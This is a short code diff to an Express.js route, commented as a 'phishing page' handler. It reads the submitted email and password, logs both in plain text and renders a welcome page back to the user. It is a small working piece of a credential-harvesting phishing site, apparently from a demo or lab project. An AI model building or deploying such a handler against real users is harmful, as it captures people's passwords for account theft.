@@ -12,9 +12,14 @@ router.get('/', function(req, res, next) {
 // post to phishing page 
 router.post('/phish', function(req,res, next) {
 
-  var user = req.body.user;
+  var user = req.body.email;
   var password = req.body.password;
   console.log(`User name = ${user}, password is ${password}`);
+  var res_body = {
+    user: user
+  }
+  
+  res.render('welcome', res_body );
 
 });
 
